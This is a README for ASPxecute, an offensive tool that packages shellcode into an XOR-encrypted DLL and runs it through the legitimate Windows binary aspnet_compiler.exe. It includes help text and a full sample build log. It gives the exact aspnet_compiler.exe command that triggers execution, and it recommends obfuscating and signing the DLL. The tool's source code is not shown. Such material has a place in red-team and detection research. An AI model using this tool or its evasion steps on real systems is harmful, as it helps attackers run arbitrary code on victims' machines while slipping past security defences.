# ASPxecute
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/whokilleddb)

ASPxecute is a payload creation tool which can be used to run shellcode using `aspnet_compiler.exe`.

## Pre-requisites

First, you will need `uv` for [your target system](https://docs.astral.sh/uv/getting-started/installation/).

### On Windows

- Make sure you have Visual Studio is installed 
- `MSBuild` exists in `$PATH`

### On Linux 

- Install `Mono` and `MSBuild`
```bash
RUN gpg --homedir /tmp --no-default-keyring --keyring /usr/share/keyrings/mono-official-archive-keyring.gpg --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
RUN echo "deb [signed-by=/usr/share/keyrings/mono-official-archive-keyring.gpg] https://download.mono-project.com/repo/ubuntu stable-focal main" | tee /etc/apt/sources.list.d/mono-official-stable.list
RUN apt update -y
RUN apt install -y mono-devel mono-complete msbuild msbuild-sdkresolver msbuild-libhostfxr
```

## Usage 

- You can print the help menu with:

```bash
$ uv run main.py --help

    ___   _____ ____                       __
   /   | / ___// __ \_  _____  _______  __/ /____
  / /| | \__ \/ /_/ / |/_/ _ \/ ___/ / / / __/ _ \
 / ___ |___/ / ____/>  </  __/ /__/ /_/ / /_/  __/
/_/  |_/____/_/   /_/|_|\___/\___/\__,_/\__/\___/

 "ASPNet is dead, Long live the ASPNET Compiler"
                                - @whokilleddb

usage: main.py [-h] -s SHELLCODE [-c CLASSNAME] [-n NAMESPACE] [-e EXTENSION]

Process shellcode file and optional metadata (class, namespace, extension).

options:
  -h, --help            show this help message and exit
  -s SHELLCODE, --shellcode SHELLCODE
                        Path to shellcode file
  -c CLASSNAME, --class CLASSNAME
                        Name of Class (optional).
  -n NAMESPACE, --namespace NAMESPACE
                        Name of Namespace
  -e EXTENSION, --extension EXTENSION
                        Extension name to use (default: wkdb).
```

- To generate a payload you can do:

```bash
uv run main.py -s D:\Malware\Shellcode\messagebox.bin -c Darth -n Vader -e stwrs

    ___   _____ ____                       __
   /   | / ___// __ \_  _____  _______  __/ /____
  / /| | \__ \/ /_/ / |/_/ _ \/ ___/ / / / __/ _ \
 / ___ |___/ / ____/>  </  __/ /__/ /_/ / /_/  __/
/_/  |_/____/_/   /_/|_|\___/\___/\__,_/\__/\___/

 "ASPNet is dead, Long live the ASPNET Compiler"
                                - @whokilleddb

[+] Using shellcode file:  D:\Malware\Shellcode\messagebox.bin
[+] Using class name:      Darth
[+] Using namespace:       Vader
[+] Using extension:       stwrs

[+] Wrote web.config to:      C:\Users\DB\AppData\Local\Temp\tmpbm06y5jt\output\web.config
[+] Created extension file:   C:\Users\DB\AppData\Local\Temp\tmpbm06y5jt\output\App_Code\2025-10-03_01-02-12.stwrs

[+] Payload Hash:             51b11d6040a565da147cf87bbd4261db
[+] Algorithm:                XOR
[+] Encryption Key:           tRLG5gx1gzEC6ce4COzsCsMI6Dd (27 bytes)
[+] Encryption Nonce:         SDn2c7MR2gLLskyVPvmDbRk (23 bytes)
[+] Infalted?:                False

[+] Wrote Shellcode file to:  C:\Users\DB\AppData\Local\Temp\tmpbm06y5jt\output\training.data
[+] Prepared Program.cs for compilation
[+] Successfully created payload DLL:  C:\Users\DB\AppData\Local\Temp\tmpbm06y5jt\build\bin\x64\Release\Vader.dll
[+] Zipped contents of 'C:\Users\DB\AppData\Local\Temp\tmpbm06y5jt\output' into 'D:\source\ASPxecute\build\Vader.zip'

[+] Build Complete
[+] Feel free to Obfuscate Vader\bin\Vader.dll
[+] When you are ready, unzip the payload and run the following command from the base directory:

        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p . -f .\none -u

[+] Ciao
```

The final build artefact can be found in the `build` dir.

## Post Payload Generation

- Once you have your payload, you run the payload DLL through an obfuscator like [Obfuscar](https://github.com/obfuscar/obfuscar)
- You can also sign the payload dll

## References 
- https://ijustwannared.team/2020/08/01/the-curious-case-of-aspnet_compiler-exe/
- https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/